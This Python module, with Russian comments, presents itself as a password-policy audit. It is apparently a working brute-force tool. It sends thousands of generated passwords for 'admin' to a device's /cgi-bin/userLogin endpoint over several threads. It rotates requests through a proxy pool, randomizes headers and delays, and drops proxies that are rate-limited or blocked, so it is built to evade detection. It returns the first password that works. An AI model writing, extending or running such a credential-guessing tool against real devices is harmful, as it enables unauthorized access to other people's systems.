# -*- coding: utf-8 -*-
"""Основной модуль аудита парольной политики."""

import queue
import threading
import time
import logging
from typing import Optional, Callable
from dataclasses import dataclass
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

from .proxy_manager import ProxyPool, ProxyNode
from .password_gen import CredentialGenerator
from .utils import RequestBehavior
from .vuln_check import TargetDevice

logger = logging.getLogger("SecurityAudit")


@dataclass
class AuditAttempt:
    success: bool
    credential: str
    proxy: ProxyNode
    response_time: float
    status_code: int
    auth_type: str
    response_sample: str


class SecurityAuditor:
    """
    Проводит аудит парольной политики устройства.
    Использует многопоточность, прокси и интеллектуальные задержки.
    """

    def __init__(self,
                 target: TargetDevice,
                 proxy_pool: ProxyPool,
                 credential_gen: CredentialGenerator,
                 username: str = 'admin',
                 auth_type: str = 'basic',
                 threads: int = 5,
                 log_callback: Optional[Callable] = None):
        self.target = target
        self.proxy_pool = proxy_pool
        self.credential_gen = credential_gen
        self.username = username
        self.auth_type = auth_type
        self.threads = threads
        self.log = log_callback or logger.info
        self.running = False
        self.found = None
        self.lock = threading.Lock()

    def _build_url(self) -> str:
        base = f"http{'s' if getattr(self.target, 'ssl', False) else ''}://{self.target.ip}:{self.target.port}"
        endpoint = '/cgi-bin/userLogin'  # можно сделать настраиваемым
        return base + endpoint

    def _try_auth(self, password: str, proxy: ProxyNode) -> Optional[AuditAttempt]:
        url = self._build_url()
        proxies = {'http': proxy.url, 'https': proxy.url}
        headers = RequestBehavior.headers()
        start = time.time()
        try:
            if self.auth_type == 'basic':
                auth = HTTPBasicAuth(self.username, password)
                r = requests.get(url, auth=auth, proxies=proxies, headers=headers, timeout=10)
            elif self.auth_type == 'digest':
                auth = HTTPDigestAuth(self.username, password)
                r = requests.get(url, auth=auth, proxies=proxies, headers=headers, timeout=10)
            elif self.auth_type == 'form':
                data = {'username': self.username, 'password': password}
                r = requests.post(url, data=data, proxies=proxies, headers=headers, timeout=10)
            else:
                return None

            elapsed = time.time() - start
            success = False
            if r.status_code == 200:
                if 'invalid' not in r.text.lower() and 'error' not in r.text.lower():
                    success = True
            return AuditAttempt(
                success=success,
                credential=password,
                proxy=proxy,
                response_time=elapsed,
                status_code=r.status_code,
                auth_type=self.auth_type,
                response_sample=r.text[:200]
            )
        except Exception as e:
            self.log(f"Ошибка с прокси {proxy.url}: {e}")
            return None

    def _worker(self, pwd_queue: queue.Queue, result_queue: queue.Queue):
        while self.running and not self.found:
            try:
                pwd = pwd_queue.get(timeout=1)
            except queue.Empty:
                break

            proxy = self.proxy_pool.get_best_proxy()
            if not proxy:
                self.log("Нет доступных прокси, ждём...")
                time.sleep(5)
                pwd_queue.put(pwd)
                continue

            attempt = self._try_auth(pwd, proxy)
            if attempt is None:
                self.proxy_pool.report_failure(proxy)
                pwd_queue.put(pwd)
                continue

            if attempt.success:
                with self.lock:
                    self.found = pwd
                self.log(f"[!] УСПЕХ: рабочая комбинация '{pwd}'")
                result_queue.put(attempt)
                break
            else:
                if attempt.status_code in [429, 403]:
                    self.proxy_pool.report_failure(proxy)
                self.log(f"[-] {pwd} не подходит (код {attempt.status_code})")
                RequestBehavior.delay(0.5, 2)

    def run(self) -> Optional[str]:
        """Запускает аудит и возвращает найденный пароль или None."""
        self.running = True
        pwd_queue = queue.Queue()
        result_queue = queue.Queue()

        for pwd in self.credential_gen.generate(limit=10000):
            pwd_queue.put(pwd)

        self.log(f"[*] Запуск аудита для {self.target.ip} с {self.threads} потоками")

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, args=(pwd_queue, result_queue))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.running = False
        if self.found:
            self.log(f"[+] Аудит завершён, найдена слабая комбинация: {self.found}")
        else:
            self.log("[!] Аудит завершён, слабые комбинации не обнаружены")

        return self.found